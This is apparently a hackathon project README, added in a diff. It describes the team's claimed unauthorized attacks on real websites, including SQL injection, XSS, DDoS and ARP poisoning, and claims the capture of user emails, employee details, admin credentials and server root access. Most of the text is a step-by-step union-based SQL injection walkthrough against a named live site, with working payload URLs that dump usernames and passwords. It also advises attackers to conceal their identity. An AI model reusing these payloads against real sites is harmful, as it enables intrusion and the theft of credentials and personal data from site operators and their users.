@@ -1,0 +1,42 @@
+LNMHacks 2018
+Team Name- ARDUINA
+Team Members-
+(i)   Manan Bindra (Team Leader)
+(ii)  Ayushi Goyal
+(iii) Harshit Mathur
+(iv)  Dheeraj Suthar
+
+Description
+The project is compiled of website links on which the team has successfully performed several attacks in the name of Penetration Testing and Information Gathering in the field of Cyber Security. The attacks include exploitation of websites and gathering their inportant data which in wrong hands can destroy the hard work of large number of people. The team has successfully implemented SQL INJECTION, XSS Vulnerabilites, DDos and ARP Poisioning. The team has successfully managed to gather email ids of users, company employees details, admin username and passwords and root access to the server.
+The motive of the team is to save the hard work of developers from inappropriate people and help them to secure their work and identify the loop holes in their online security system.
+
+The EXCEL SHEET of targeted websites is provided in the directory and a google drive link is given which contains the proof of the data gathered.
+Finally the team has mailed several websites about their vulnerabilities so that they can secure them along with the solutions. The solutions are also provided in powerpoint presentaion.
+
+Procedure of Attack-
+NOTEs:-
+1.Team member assisstance will be required for demontration of attack.
+2.Do not try these attacks without securing your own identity using some cyber security measures.
+
+Step by Step Approach-
+1. Target a website. For e.g. http://soccerfield.pk/pages.php?id=2
+2. Add a query "'" in the URL of the website to check for vulnerability.
+   http://soccerfield.pk/pages.php?id=2'
+3. If there is an error and the website does not open, vulnerability is detected.
+4. Now we will find maximum number of columns in the webite by Hit and Trail Method.
+   http://soccerfield.pk/pages.php?id=2 order by 14  
+   (We need to check at random by changing the numeric value. Rule-If the website opens normally, there are more columns!!!)
+5. The maximum number of columns for our site is 14.
+6. Now we'll find vulnerable columns by executing the following data-
+   http://soccerfield.pk/pages.php?id=-2%20union%20select%201,2,3,4,5,6,7,8,9,group_concat(table_name),11,12,13,14%20from   %20information_schema.tables%20where%20table_schema=database()--
+   (This will give us the vulnerable column number)
+7. We can gather the output from this vulnerable column by exploiting the TABLE NAME and COLUMN NAME.
+   http://soccerfield.pk/pages.php?id=-2%20union%20select%201,2,3,4,username,6,7,8,9,password,11,12,13,14%20from%20users--
+8. Now we will identify the desirable table output. We'll be looking for tables which have admin and password deatils.
+   http://soccerfield.pk/pages.php?id=-2%20union%20select%201,2,3,4,username,6,7,8,9,password,11,12,13,14%20from%20users--
+9. The above step will reveal the output on the webite there itself.
+
+NOTE-To test this, Assisstance of Team Member will be required.
+
+LOCALHOST-
+This requires no hosting as it is a PENETRATION TEST which is subject to change.
